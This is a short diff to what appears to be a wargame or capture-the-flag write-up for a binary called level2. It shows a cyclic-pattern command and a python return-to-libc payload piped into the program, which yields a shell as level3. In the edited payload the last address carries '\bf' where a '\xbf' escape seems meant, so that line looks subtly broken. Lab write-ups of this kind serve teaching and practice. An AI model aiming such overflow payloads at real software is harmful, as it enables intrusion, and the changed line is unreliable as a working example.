@@ -7,7 +7,7 @@ We found two methods here :
 First, we have to check if there is an overflow and where.
 
 ```sh
-$ python ../tools/pattern.py 100
+$ python pattern.py 100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 ```
 
@@ -81,7 +81,7 @@ Now, it's time for the exploit :D<br>
 `[ OFFSET ] [ RETURN ADDRESS ] [ SYSTEM ADDRESS ] [ EXIT ADDRESS ] [ ARGS ADDRESS ]`
 
 ```sh
-$ (python -c 'print("A" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'; cat) | ./level2
+$ (python -c 'print("A" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x1d\xf9\xff\bf")'; cat) | ./level2
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAK`�����X���
 whoami
 level3
